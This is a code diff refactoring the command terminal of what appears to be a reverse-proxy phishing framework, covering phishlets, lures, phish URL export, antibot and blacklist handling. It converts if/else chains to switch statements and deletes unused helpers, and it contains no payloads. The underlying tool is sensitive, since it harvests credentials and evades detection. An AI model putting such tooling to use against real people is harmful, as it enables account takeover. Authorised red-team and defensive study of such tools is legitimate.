@@ -534,14 +534,15 @@ func (t *Terminal) handleConfig(args []string) error {
 
 func (t *Terminal) handleBlacklist(args []string) error {
 	pn := len(args)
-	if pn == 0 {
+	switch pn {
+	case 0:
 		mode := t.cfg.GetBlacklistMode()
 		ip_num, mask_num := t.p.bl.GetStats()
 		log.Info("blacklist mode set to: %s", mode)
 		log.Info("blacklist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)
 
 		return nil
-	} else if pn == 1 {
+	case 1:
 		switch args[0] {
 		case "all":
 			t.cfg.SetBlacklistMode(args[0])
@@ -574,7 +575,7 @@ func (t *Terminal) handleBlacklist(args []string) error {
 			log.Success("blacklist cleared")
 			return nil
 		}
-	} else if pn == 2 {
+	case 2:
 		switch args[0] {
 		case "log":
 			switch args[1] {
@@ -608,7 +609,8 @@ func (t *Terminal) handleBlacklist(args []string) error {
 
 func (t *Terminal) handleWhitelist(args []string) error {
 	pn := len(args)
-	if pn == 0 {
+	switch pn {
+	case 0:
 		enabled := t.cfg.IsWhitelistEnabled()
 		ip_num, mask_num := t.p.wl.GetStats()
 		status := "disabled"
@@ -626,7 +628,7 @@ func (t *Terminal) handleWhitelist(args []string) error {
 		}
 
 		return nil
-	} else if pn == 1 {
+	case 1:
 		switch args[0] {
 		case "on":
 			t.cfg.SetWhitelistEnabled(true)
@@ -655,7 +657,7 @@ func (t *Terminal) handleWhitelist(args []string) error {
 			}
 			return nil
 		}
-	} else if pn == 2 {
+	case 2:
 		switch args[0] {
 		case "add":
 			err := t.p.wl.AddIP(args[1])
@@ -1915,11 +1917,12 @@ func (t *Terminal) handleAntibot(args []string) error {
 			if pn < 3 {
 				return fmt.Errorf("syntax: antibot override_ips <add|remove> <ip>")
 			}
-			if args[1] == "add" {
+			switch args[1] {
+			case "add":
 				t.cfg.AddAntibotOverrideIP(args[2])
 				log.Success("Added IP to antibot override list: %s", args[2])
 				return nil
-			} else if args[1] == "remove" {
+			case "remove":
 				t.cfg.RemoveAntibotOverrideIP(args[2])
 				log.Success("Removed IP from antibot override list: %s", args[2])
 				return nil
@@ -1931,7 +1934,8 @@ func (t *Terminal) handleAntibot(args []string) error {
 
 func (t *Terminal) handleProxy(args []string) error {
 	pn := len(args)
-	if pn == 0 {
+	switch pn {
+	case 0:
 		var proxy_enabled string = "no"
 		if t.cfg.proxyConfig.Enabled {
 			proxy_enabled = "yes"
@@ -1941,7 +1945,7 @@ func (t *Terminal) handleProxy(args []string) error {
 		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
-	} else if pn == 1 {
+	case 1:
 		switch args[0] {
 		case "enable":
 			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
@@ -1959,7 +1963,7 @@ func (t *Terminal) handleProxy(args []string) error {
 			t.cfg.EnableProxy(false)
 			return nil
 		}
-	} else if pn == 2 {
+	case 2:
 		switch args[0] {
 		case "type":
 			if t.cfg.proxyConfig.Enabled {
@@ -3678,14 +3682,7 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 	return string(json)
 }
 
-func (t *Terminal) tokensToJSON(tokens map[string]string) string {
-	var ret string
-	white := color.New(color.FgHiWhite)
-	for k, v := range tokens {
-		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
-	}
-	return ret
-}
+
 
 func (t *Terminal) checkStatus() {
 	if t.cfg.GetBaseDomain() == "" {
@@ -3793,16 +3790,7 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	return AsTable(cols, rows)
 }
 
-func (t *Terminal) sprintIsEnabled(enabled bool) string {
-	logray := color.New(color.FgHiBlack)
-	normal := color.New(color.Reset)
 
-	if enabled {
-		return normal.Sprint("true")
-	} else {
-		return logray.Sprint("false")
-	}
-}
 
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
@@ -4053,7 +4041,8 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 	}
 	defer f.Close()
 
-	if format == "text" {
+	switch format {
+	case "text":
 		for n, phish_url := range phish_urls {
 			var params string
 			m := 0
@@ -4071,7 +4060,7 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 				return err
 			}
 		}
-	} else if format == "csv" {
+	case "csv":
 		var data [][]string
 
 		w := csv.NewWriter(bufio.NewWriter(f))
@@ -4106,7 +4095,7 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 		if err != nil {
 			return err
 		}
-	} else if format == "json" {
+	case "json":
 		type UrlItem struct {
 			PhishUrl string            `json:"url"`
 			Params   map[string]string `json:"params"`
@@ -4163,10 +4152,7 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 	return ret
 }
 
-func (t *Terminal) sprintVar(k string, v string) string {
-	vc := color.New(color.FgYellow)
-	return k + ": " + vc.Sprint(v)
-}
+
 
 func (t *Terminal) filterInput(r rune) (rune, bool) {
 	switch r {
